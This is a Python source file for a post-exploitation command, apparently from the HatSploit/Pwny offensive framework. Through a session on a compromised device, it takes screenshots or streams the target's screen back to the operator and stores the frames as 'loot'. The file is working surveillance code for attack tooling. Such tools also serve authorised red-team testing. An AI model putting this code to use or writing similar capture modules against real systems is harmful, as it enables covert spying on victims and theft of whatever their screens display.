"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import sys
import threading

from pwny.api import *
from pwny.types import *

from pex.proto.stream import StreamClient

from badges.cmd import Command

UI_BASE = 6

UI_SCREENSHOT = tlv_custom_tag(API_CALL_STATIC, UI_BASE, API_CALL)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "screen",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer',
                'EntySec - Windows implementation'
            ],
            'Description': "Stream screen or take screenshot.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-s', '--snap'),
                    {
                        'help': "Take a screenshot from device.",
                        'action': 'store_true'
                    }
                ),
                (
                    ('-S', '--stream'),
                    {
                        'help': "Stream selected device.",
                        'action': 'store_true'
                    }
                ),
                (
                    ('-o', '--output'),
                    {
                        'help': "Local file to save screenshot to.",
                        'metavar': 'FILE'
                    }
                )
            ]
        })

        self.stop = False

    def read_thread(self, path: str):
        while True:
            if self.stop:
                break

            result = self.session.send_command(
                tag=UI_SCREENSHOT
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to take screenshot!")
                break

            frame = result.get_raw(TLV_TYPE_BYTES)

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

            except Exception:
                self.print_error(f"Failed to write image to {path}!")

    def run(self, args):
        if args.stream:
            file = self.session.loot.random_loot('bmp')
            path = self.session.loot.random_loot('html')

            thread = threading.Thread(target=self.read_thread, args=(file,))
            thread.setDaemon(True)
            thread.start()

            client = StreamClient(path=path, image=file)
            client.create_video()

            self.print_process("Streaming screen...")
            self.print_information("Press Ctrl-C to stop.")

            try:
                client.stream()
                for _ in sys.stdin:
                    pass

            except KeyboardInterrupt:
                self.print_process("Stopping stream...")

            self.stop = True
            thread.join()

            self.session.loot.remove_loot(file)
            self.session.loot.remove_loot(path)

        elif args.snap:
            result = self.session.send_command(
                tag=UI_SCREENSHOT
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to take screenshot!")
                return

            frame = result.get_raw(TLV_TYPE_BYTES)

            if args.output:
                path = args.output
            else:
                path = self.session.loot.random_loot('bmp')

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

                self.print_success(f"Screenshot saved to {path}!")

            except Exception:
                self.print_error(f"Failed to write image to {path}!")
